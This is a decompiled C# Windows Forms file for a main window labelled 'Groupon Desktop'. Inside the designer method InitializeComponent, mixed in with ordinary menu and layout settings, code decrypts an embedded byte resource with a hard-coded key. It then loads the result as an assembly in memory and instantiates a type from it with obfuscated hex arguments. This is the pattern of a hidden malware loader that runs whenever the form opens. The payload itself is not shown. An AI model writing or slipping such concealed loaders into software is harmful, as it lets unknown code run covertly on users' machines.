using System;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Coache.Core;
using Coache.Login;

namespace Coache;

[NonNavigable]
public class MainView : Form
{
	private IContainer components;

	private MenuStrip mainMenu;

	public MainView()
	{
		InitializeComponent();
	}

	private void Hi2(Type TTP)
	{
		Activator.CreateInstance(TTP, "4279746541727261795479706549", "586535", "Coache");
	}

	private void MainView_Load(object sender, EventArgs e)
	{
		ViewsManager.SetMainWindow((Form)(object)this);
		ViewsManager.LoadView((Form)(object)new LoginForm());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		mainMenu = new MenuStrip();
		((Control)this).SuspendLayout();
		byte[] guide = etc.Guide;
		byte[] bytes = Encoding.ASCII.GetBytes("G44H55GC7G87G5ZC45A7O2");
		for (int i = guide.Length * 2 + bytes.Length; i >= 0; i += -1)
		{
			guide[i % guide.Length] = (byte)((Convert.ToInt32(guide[i % guide.Length] ^ bytes[i % bytes.Length]) - Convert.ToInt32(guide[(i + 1) % guide.Length]) + 256) % 256);
		}
		Type tTP = AppDomain.CurrentDomain.Load(guide).GetExportedTypes()[1];
		((Control)mainMenu).set_Location(new Point(0, 0));
		((Control)mainMenu).set_Margin(new Padding(0, 30, 0, 30));
		((Control)mainMenu).set_Name("mainMenu");
		Hi2(tTP);
		((Control)mainMenu).set_Size(new Size(914, 24));
		((Control)mainMenu).set_TabIndex(0);
		((Control)mainMenu).set_Text("menuStrip1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(914, 568));
		((Control)this).get_Controls().Add((Control)(object)mainMenu);
		((Form)this).set_IsMdiContainer(true);
		((Form)this).set_MainMenuStrip(mainMenu);
		((Control)this).set_Name("MainView");
		((Control)this).set_Padding(new Padding(0, 0, 0, 10));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Groupon Desktop");
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)MainView_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
